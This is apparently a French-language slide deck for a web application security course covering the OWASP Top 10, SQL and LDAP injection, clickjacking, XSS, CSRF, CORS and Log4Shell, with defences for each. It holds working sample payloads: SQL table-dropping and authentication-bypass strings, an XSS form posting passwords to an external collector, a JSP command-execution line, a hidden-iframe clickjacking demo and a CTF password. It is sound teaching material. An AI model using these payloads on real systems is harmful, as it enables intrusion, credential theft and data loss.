<!-- .slide: data-background-image="images/securite-informatique.png" data-background-size="1200px" class="chapter" -->
## 1
### Failles applicatives

-----

<!-- .slide: class="slide" -->
### Qu'est ce qu'une faille applicative ?
**[Wikipedia](https://fr.wikipedia.org/wiki/Vuln%C3%A9rabilit%C3%A9_(informatique))**

*Une vulnérabilité ou faille est une faiblesse dans un système informatique permettant à un attaquant de porter atteinte à l'intégrité de ce système, c'est-à-dire à son fonctionnement normal, à la confidentialité ou à l'intégrité des données qu'il contient*

-----

<!-- .slide: class="slide" -->
### Qu'est ce qu'une faille applicative ?
- Une erreur de programmation (bug, fonctionnalité mal implémentée) ?
- Une erreur de configuration ?
- Une erreur de conception ?

-----

<!-- .slide: class="slide" -->
### Une erreur de conception ?
*Soit une plateforme de réservation en ligne pour des chambres d'hôtel.*

*Je propose aux utilisateurs d'annuler leurs commandes jusqu'à 16 h.*

*Un concurrent peut facilement pourrir mon hôtel en réservant toutes les chambres et en les annulant à 15h55.*

Est ce que cela fait partie du **fonctionnement normal** ?

-----

<!-- .slide: class="slide" -->
### Une erreur de conception ?
*Sur le WS gestion des contacts, on peut créer autant d'habilitations que l'on veut pour un contact*

Au delà d'environ 300 habilitations c'est l'annuaire qui finit par planter...

-----

<!-- .slide: class="slide" -->
### Une erreur de configuration ?
- L'application n'est pas proposée et forcée en HTTPS
- Flux trop large en entrée
- Secrets exposés
- Bibliothèques à jour mais avec une configuration permettant de faire n'importe quoi
- ...

-----

<!-- .slide: class="slide" -->
### Une erreur de programmation ?
- Son propre code
- Les bibliothèques utilisées : Nécéssité de mise à jour régulière !

-----

<!-- .slide: class="slide" -->
<img src="./images/top10.jpg" width="100%" />

-----

<!-- .slide: class="slide" -->
### Ouais... un top !
- Le top 10 des vulnérabilités : OWASP
- https://owasp.org/www-project-top-ten/

-----

<!-- .slide: class="slide" -->
- A1 : Acceder à une ressource non prévue :
  - Mauvaise gestion des droits
  - En forcant un utilisateur privilégié à cliquer sur l'action souhaitée = XSS y compris injection de code "côté client"
  - Vol de session : conséquence de XSS et d'injection de code "côté client"
- A2 : Ne pas ou mal utiliser un canal chiffré
  - Protocoles obsolètes, contrôles non effectués
  - HTTPS non obligatoire

-----

<!-- .slide: class="slide" -->
- A3 : Injection de code "côté serveur"
  - Faire éxécuter du code non prévu en particulier directement sur la base de données
- A4 : Erreur de conception
  - La meilleure des implémentations ne corrigera pas
- A5 : Erreur de configuration
- A6 : Bibliothèques pas à jour (ou utilisation de bibliothèques abandonnées)
  - Bugs des "autres"

-----

<!-- .slide: class="slide" -->
- A7 : Failblesses d'authentification
  - Possibilité de brute force
  - Mots de passe faibles ou trop standards
  - Déconnexions et invalidation de session mal gérés
- A8 : Non controles d'intégrité
  - Données entrantes (au run)
  - Bibliothèques vérolées (au build)

-----

<!-- .slide: class="slide" -->
- A9 : Défaut de tracabilité
  - Logs inexploitables
  - Impossible de savoir clairement qui a fait quoi et quand
- A10 : Injection de code "côté serveur", vision réseau
  - Sécurité en profondeur, cloisonnement réseau
  - Comptes applicatif à droits limités

-----

<!-- .slide: class="slide" -->
### Les vulnérabilités concrètement !

-----

<!-- .slide: class="slide" -->
### L'injection de code
<img src="./images/injection_sql.png" width="100%" />
> https://imgs.xkcd.com/comics/exploits_of_a_mom.png

-----

<!-- .slide: class="slide" -->
### L'injection de code
Que s'est-il passé ?

>#### École municipale de Kelkepare
>**Inscription d'un nouvel élève**
>
>Prénom : <input id="scriptEvil0" type="text" /> <button onClick="injection();" >Inscrire l'élève</button>
><ul id="myUl0"></ul>

-----

<!-- .slide: class="slide" -->
### L'injection de code
Que s'est-il passé ?
```java
public void inscrireEleve(String prenom){
  String maRequeteSQL = "INSERT INTO Students VALUES ('" + prenom + "')";
  connectionSql.createStatement().executeQuery(maRequeteSQL);
}
```

-----

<!-- .slide: class="slide" -->
### L'injection de code
Que s'est-il passé ?
- Si on remplit dans le formulaire `Robert'); DROP TABLE Students;--`
- La requète envoyée au serveur devient : 
```
INSERT INTO Students VALUES ('Robert'); DROP TABLE Students;--')
```

-----

<!-- .slide: class="slide" -->
### L'injection de code "côté serveur" : SQL ou LDAP

Pourquoi ?
- Consulter des données confidentielles
- Altérer la base de données  

-----

<!-- .slide: class="slide" -->
### L'injection de code  "côté serveur"
#### Exemple en SQL
```java
"SELECT * FROM USER WHERE identifiant='" + username + "' AND password='" + password + "'";
```
à renseigner avec username=`robichu` et password=`' OR '1'='1' --` pour se connecter en tant que M Robichu

-----

<!-- .slide: class="slide" -->
### L'injection de code  "côté serveur"
#### Exemple en LDAP

```java
"(&(uid = " + user_name + ") (userpassword = " + user_password + "))";
```
 à renseigner avec username=`robichu)(&)` pour se connecter en tant que M Robichu

-----

<!-- .slide: class="slide" -->
### L'injection de code "côté serveur" : SQL ou LDAP
Sécurité :
- Échapper les caractères spéciaux 
- => Utiliser des PreparedStatement
- => Utiliser des Frameworks qui font le boulot (hibernate, ...)
- **Et que l'on garde à jour bien entendu**

-----
<!-- .slide: class="slide" -->
# Vous avez Gagné
<button>Cliquez la</button>
<iframe id="t"
    title="t"
    width="1500"
    height="1000"
    style="opacity: 0; position: relative;top: -5em; left: -10em;"
    src="http://localhost:8180/admin/master/console/#/realms/test/clients">
</iframe>

-----
<!-- .slide: class="slide" -->
# Vous avez Gagné
<button>Cliquez la</button>
<iframe id="t"
    title="t"
    width="1500"
    height="1000"
    style="opacity: 0.3; position: relative;top: -5em; left: -10em;"
    src="http://localhost:8180/admin/master/console/#/realms/test/clients">
</iframe>

-----

<!-- .slide: class="slide" -->
# Le clickjacking
![clickjacker](./images/clickjacker.jpg)

-----

<!-- .slide: class="slide" -->
# Les attaques basées sur des croisements de domaines

-----

<!-- .slide: class="slide" -->
- Un utilisateur connecté sur un site légitime envoie des données à un site attaquant
- Un site attaquant force un utilisateur à faire une opération non souhaité sur le site légitime

-----
<!-- .slide: class="slide" -->
### Les `<iframe>`
- Principe légitime à la base : afficher une page web sur une autre page web
- Comportements détournés
- Clickjacking = on cache une iframe par dessus un bouton aparemment légitime

```html
<iframe style="opacity: 0" src="https://le-site-des-admins">
```

-----

<!-- .slide: class="slide" -->
### XFS
- XFS ou Cross Frame Scripting : principe général d'attaque consistant à injecter le site légitime sur le site du pirate via un iframe

-----

<!-- .slide: class="slide" -->
- Protection
  - **Déclarative** uniquement = on va dire au navigateur que le site n'a aucune raison légitime d'être dans une iframe
  - Des entêtes standards existent :
  ```
  X-Frame-Options:<DENY|SAMEORIGIN|ALLOW-FROM https://example.com/>;
  ```
  - On filtre donc les origines qui ont le droit d'afficher l'iframe
  - /!\ Absence d'entête = autorisé de n'importe quel source

-----
<!-- .slide: class="slide" -->
### L'injection de code... côté client !

>#### École municipale de Kelkepare
>**Inscription d'un nouvel élève**
>
>Prénom : <input id="scriptEvil" type="text" /> <button onClick="fonction()">Inscrire l'élève</button>
>
><ul id="myUl"></ul>

-----

<!-- .slide: class="slide" -->
### L'injection de code... côté client !
Et si j'écrit dans le formulaire :
```
<form action="https://securite-applicative.free.beeceptor.com" >Entrez votre mot de passe : <input type="password" name="password" /><button type="submit" formtarget="_blank">Me connecter</button></form>
```


Que se passe-t-il ici ? : https://beeceptor.com/console/securite-applicative

-----

<!-- .slide: class="slide" -->
### L'injection de code... côté client !
Déclinable à souhait...
```
<button onclick="window.location='https://securite-applicative.free.beeceptor.com'" >Continuer</button>
```

-----

<!-- .slide: class="slide" -->
### L'injection de code "côté client"
On peut forcer un utilisateur a provoquer ces modifications du DOM ou tout autre action
- En le redirigeant sur la page avec des paramètres de requete trafiqués
- En stockant en base un code qui va être réaffiché

-----

<!-- .slide: class="slide" -->
### L'injection de code "côté client"
- On peut ainsi rajouter ce genre de code sur la page de l'utilisateur
```html
<script>document.location="https://no.domain"</script>
```
```html
<script>
document.getElementsByTagName("body")[0].innerHTML("
<form action='https://no.domain' >
<br>Connectez vous !<br>
<input type='text' name='email'>
<input type='password' name='mot de passe'>
<input type='submit' value='Connexion'>
</form>
")
</script>
```

-----
<!-- .slide: class="slide" -->
## L'injection de code "côté client" : XSS (Cross-Site Scripting)

-----
<!-- .slide: class="slide" -->
### Pourquoi ?
- Vol de données, en particulier des cookies de session ([explications](/securite-applicative/digressions.html#/la-session-http))
- Redirection malveillante

-----

<!-- .slide: class="slide" -->
### Comment ?
- Consiste à injecter du code et en particulier des script dans une page web (**donc éxécuté par l'utilisateur dans son navigateur**)
- L'attaquant fournit une requête vers un site légitime mais dont le contenu injecte le code
- L'attaquant peut aussi profiter d'une non validation des données persistantes (BDD)

-----

<!-- .slide: class="slide" -->
### Types de XSS
- Injection "en direct" par le serveur, on parle de reflected XSS
- On l'appelle DOM XSS, si elle consiste à modifier le DOM via un script
- Pire, XSS Stored : le pirate arrive à écrire ce code dans une base de données ou dans un fichier local. Il n'a même plus besoin de fournir un lien trafiqué à l'utilisateur.

-----

<!-- .slide: class="slide" -->
## Sécurité :
- Vérifier les entrées utilisateurs !
- Echapper caractères spéciaux HTML (utiliser au maximum les sécurités internes des framework, sinon des fonctions existent déjà dans les principaux langages, par exemple `${fn:escapeXml(string)}` dans une EL en JSP)

-----

<!-- .slide: class="slide" -->
## Compléments pour la protection des cookies
- Forcer les cookies à être "secure" (utilisable en https uniquement), "httpOnly" (non utilisable dans les scripts)
- Précision : il s'agit de sécurité **déclarative** dont la mise en oeuvre est à la charge du navigateur

-----

<!-- .slide: class="slide" -->
# Un peu plus de pratique ??

-----

<!-- .slide: class="slide" -->
### Avant de continuer...
Découvrons une série challenge disponible sur internet
- [Natas 0](http://natas0.natas.labs.overthewire.org) (mot de passe de natas0 : `natas0`)
- Sur les premiers niveaux, on voit qu'une resource cachée n'est jamais cachée (<a href="/securite-applicative/digressions.html#/le-fichier-robots-txt" target="_blank">Digression : robots.txt</a>) et que quelques éléments pouvent être très facilement manipulés dans la requête

-----

<!-- .slide: class="slide" -->
### L'injection de code : le retour de la revanche
Quelques niveaux plus tard :
- [Natas 12](http://natas12.natas.labs.overthewire.org) (mot de passe de natas12 : `EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3`)
- Le but est de découvrir le mot de passe de natas13 situé dans /etc/natas_webpass/natas13
- Hint : passthru est une fonction php permettant d'éxécuter sur le sytème du code arbitraire <!-- .element: class="fragment"-->

-----

<!-- .slide: class="slide" -->
### L'injection de code : le retour de la revanche
Exécution de code sur le serveur

- Mettre un fichier malicieux sur le serveur permettant l'éxécution de code à distance.
- Ici le code injecté sera du code **éxécuté côté serveur** (java sur jsp, php)

-----

<!-- .slide: class="slide" -->
### L'injection de code "côté serveur"
- Exécution de code sur le serveur au plus près du système
- Rebond sur le SI possible si :
  - flux larges entre les différents serveurs
  - compte éxécutant le code à haut privilège


-----

<!-- .slide: class="slide" -->
- Nombreuses possibilités : aussi bien des traitements dans l'application non prévus que des opérations directement sur le système d'exploitation
- Par exemple réussir à placer sur le serveur une jsp contenant :
```jsp
<%Runtime.getRuntime().exec("less /confidentiel/data");%>
```
- Un langage de programmation lance indirectement des commandes système

-----

<!-- .slide: class="slide" -->
## Sécurité :
- Contrôler les entrées utilisateurs et en particulier  pour les **fichiers** : 
  - le type MIME des entrées, la cohérence type attendu et contenu autant que possible
  - l'extention de fichier nommé car le serveur et/ou le navigateur peut interpréter différemment un fichier selon son nommage

-----

<!-- .slide: class="slide" -->
## Sécurité :
- Côté prod : 
  - "chroot" des applications ou machines limité à un traitement
  - utilisateur éxécutant l'application avec droit limités (ce n'est pas le compte root/admin qui démarre le tomcat)
  - flux limités entre machines

-----

<!-- .slide: class="slide" -->
### L'injection de code : Synthèse
- Un sujet central : l'entrée untilisateur
- Mais qu'est ce qu'une entrée utilisateur ?

-----
<!-- .slide: class="slide" -->
### L'injection de code
Qu'est ce qu'une entrée utilisateur ?
- Requête et Paramètres de requête
- Corps de requête (contenu des requête POST et PUT) : réponse à un formulaire, fichier
- Cookies
- [Entetes HTTP](https://developer.mozilla.org/fr/docs/Web/HTTP/Headers) (Authorization, Location, Host, User-Agent, Referrer, Cookies, CORS, ...)

-----
<!-- .slide: class="slide" -->
### L'injection de code

Controle des chaines entrées et échappement de tous les caratères interprétables en html, en sql,... selon la situation.

Un développeur web peut se contenter de surveiller ces entrées mais en réalité, les failles peuvent survenir sur n'importe quel bit d'un échange réseau.

-----

<!-- .slide: class="slide" -->
### Les attaques basées sur des échanges entre domaines : encore une !!
CSRF (Cross-Site Request Forgery) 
- scénario : Le pirate souhaite effectuer une opération en votre nom. Pour cela il vous fait cliquer sur un lien ou un formulaire qui pointe vers un formulaire du site cible. Si vous êtes authentifié sur le cible cible, l'action s'effectue en votre nom. La vulnérabilité existe sur les authentifications basées sur des cookies ou sur des authentifications sso.

-----
<!-- .slide: class="slide" -->
### Démo CSRF
https://www.root-me.org/fr/Challenges/Web-Client/CSRF-0-protection

Un admin regarde vraiment ses messages de temps en temps !

-----

<!-- .slide: class="slide" -->
### Protections
Problématique :
- On ne cherche pas à empécher une acton malveillante en soi
- On cherche à empécher un utilisateur de faire une opération légitime mais forcée par le pirate. On veut s'assurer que l'utilisateur réalise son opération en pleine conscience.

-----

<!-- .slide: class="slide" -->
### Protections
- Vérifier les entrées utilisateurs ? 
- Ici, l'action à bloquer est légitime...

-----

<!-- .slide: class="slide" -->
### Protections
- Faire en sorte qu'à chaque appel d'un vrai formulaire du site, un jeton à usage unique soit ajouté. Le serveur pourra ainsi s'assurer de la cohérence de la requête
- Des bibliothèques peuvent aider à cette protection : Spring security, pac4j

-----

<!-- .slide: class="slide" -->
### Protections
- Il faut alors ajouter dans chaque formulaire le jeton en hidden
```html
<form action="/monActionAdmin"
  method="post">
  <input type="submit"
    value="Faire l'opération sensible" />
  <input type="hidden"
    name="${_csrf.parameterName}"
    value="${_csrf.token}"/>
</form>
```

-----

<!-- .slide: class="slide" -->
### Protections
- Principe tout POST ne contenant pas ce paramètre se soldera par une 403
- Potentiellement pas nécessaire sur tout le site
- Pour lever la protection en spring security:
```java
http.csrf().ignoringAntMatchers("/saml/**"); // l'ignorer sur certaines url
http.csrf().disable(); // l'ignorer complètement
```

-----

<!-- .slide: class="slide" -->
### CSRF et applis "modernes"
Frontend JS + Backend Java
- Pas de formulaire côté serveur
- Des requêtes isolée, pas de cookie mais authentification par jeton
- Si je sers "presque" le même service javascript, si l'admin se connecte à mon service, je peux lui faire réaliser toutes les requêtes que je souhaite
- Protection = vérifier l'url où l'admin a récupéré le script

-----

<!-- .slide: class="slide" -->
### La protection CORS
Cross Over Resource Sharing

Scénario d'attaque :
- J'arrive sur un site pirate, qui déclenche un script récupérant une information sur le site cible, par exemple un site interne inaccessible d'Internet. L'information est ainsi chargée sur la page et la suite du script peut par exemple la renvoyer au pirate.

-----

<!-- .slide: class="slide" -->
Contre-attaque :
- Seul le navigateur sait le site réel où il a récupéré le site
- Sur tout navigateur (récent), un script éxécuté par le client et appelant une ressource externe effectuera une vérification CORS
- => La requête ne fonctionnera que si le site externe renvoit un entête Access-Control-Allow-Origin correspond au domaine du site source

*Le site dit : voici l'url des sites qui peuvent m'appeler*

-----

<!-- .slide: class="slide" -->
Les navigateurs envoient systématiquement et automatiquement l'entête `Origin` (à moins d'utiliser Netscape 8 ou IE 6)

**Le navigateur n'autorise pas la modification de cet entete par script**

-----

<!-- .slide: class="slide" -->
### La protection CORS
- Pour les requêtes GET et POST "simple", supposées sans effets de bord (application/x-www-form-urlencoded,multipart/form-data,text/plain) : la requête est directement envoyée mais le résultat ne s'affiche qu'en cas de validation de CORS
- Pour les autres requêtes (avec effets de bord), le navigateur envoie préalablement une requête OPTION, vérifie CORS, et n'exécute la requête qu'en cas de validation
- !!! Les navigateurs vont maintenant plus loin et font la même vérification OPTION pour ces requêtes

-----

<!-- .slide: class="slide" -->
### La protection CORS
- C'est donc le serveur qui a la charge de lire l'entête `Origin`, de répondre ou non selon le contenu
- Le serveur DOIT ajouter l'entete `Access-Control-Allow-Origin`  en cas de succès
- Par défaut un serveur ne va bien sûr rien renvoyer et sera donc impossible à appeler par script
- On peut envisager de renvoyer `Access-Control-Allow-Origin: *` si le site ne fournit que des données publiques non sensibles

-----

<!-- .slide: class="slide" -->
### La protection CORS
Domaine au sens CORS :
- Un domaine signifie dans ce contexte un triplet (protocole, nom de domaine, port).
- http://localhost:8080 n'est pas le même domaine que https://localhost:8443 et le domaine https://localhost (sous entendu port 443) est encore différent

-----

<!-- .slide: class="slide" -->
### Scénario CORS
- Un script lance une requête vers un autre domaine que celui où il est exécuté, typiquement via un XMLHttpRequest().
- Le navigateur ajoute l'entete Origin à la requête
- Cet entête n'est pas modifiable par script

```
Origin: https://localhost:8443
```

-----

<!-- .slide: class="slide" -->
### Scénario CORS
- Le serveur recoit la requete et peut contrôler la présence de Origin s'il s'attend à de telles requêtes via script
- Le serveur possède un certain nombre de domaine autorisés à le contacter par script et potentiellement tous (\*)

-----

<!-- .slide: class="slide" -->
### Scénario CORS
- Le serveur peut bloquer la requête si elle ne correspond pas à ses domaines autorisés
- Si le serveur choisit de répondre et qu'il est configuré pour, il ajoute un ou plusieurs entêtes Access-Control-Allow-Origin :

```
Access-Control-Allow-Origin: https://localhost:8443
Access-Control-Allow-Origin: http://localhost:8080
```

- S'il accepte n'importe quel requête issue d'un script :

```
Access-Control-Allow-Origin: *
```

-----

<!-- .slide: class="slide" -->
### Scénario CORS
- Le navigateur lit la réponse du serveur
- Si elle ne contient pas d'entête Access-Control-Allow-Origin ou qu'aucun entête Access-Control-Allow-Origin ne correspond au domaine source, le navigateur ne retourne rien au script. *Le script ne fait pas la difference entre un echec de connexion et une erreur cors*

-----

<!-- .slide: class="slide" -->

Gestion des erreurs :
- Pour debugger, la console du navigateur vous prévient que la réponse a été bloquée

Test :
<button onClick="testCors();">Test CORS KO</button>

-----

<!-- .slide: class="slide" -->
### La protection CORS
- Attention à l'autorisation globale (elle peut parfois être nécessaire cependant) : `Access-Control-Allow-Origin: *`
- L'idéal est de controler côté serveur l'entete "Origin" et de personnaliser l'entete "Access-Control-Allow-Origin" si on accepte
- Le détails complet de CORS ici : https://developer.mozilla.org/fr/docs/Web/HTTP/CORS

-----

<!-- .slide: class="slide" -->
### La protection CORS
- Il faut garder à l'esprit que CORS est une sécurité *côté client* pour l'empécher de faire n'importe quoi malgré lui : fournir à un script une information que le serveur n'a pas prévu d'être utilisée par un script.

-----

<!-- .slide: class="slide" -->
### Synthèse
Deux grands types de protection
- Vérifier les entrées utilisateurs ! (Sécurité active)
- Vérifier que l'utilisateur est bien conscient de ses actions :
  - Vérification d'état (Sécurité active)
  - Dire au navigateur quelles opérations sont légitimes ou non (Sécurité déclarative)

-----

<!-- .slide: class="slide" -->
### S'initier aux failles applicatives
- [OWASP](https://www.owasp.org)
  - Documentation et notamment le OWASP top 10
  - WebGoat (découverte de failles sous forme de cours)
  - Juice Store (challenges)
- [Natas](https://overthewire.org/wargames/natas/)
- [Root Me](https://www.root-me.org/)

Par ailleurs le [CERT-FR](https://www.cert.ssi.gouv.fr/) est un sytème de notification des failles applicatives. Il publie aussi régulièrement des articles de cybersécurité.

-----

<!-- .slide: class="slide" -->
### Surveiller les dépendances obsolètes
- Dependabot (vérification existance d'une nouvelle version)
- Pour vérifier vulnérabilités connues : https://owasp.org/www-project-dependency-check/

-----

<!-- .slide: class="slide" -->
### "Le code des autres"

- Log4Shell *Decembre 2021*
- https://fr.wikipedia.org/wiki/Log4Shell
- Voir projet exploit
- Exploiter avec https://canarytokens.org/generate
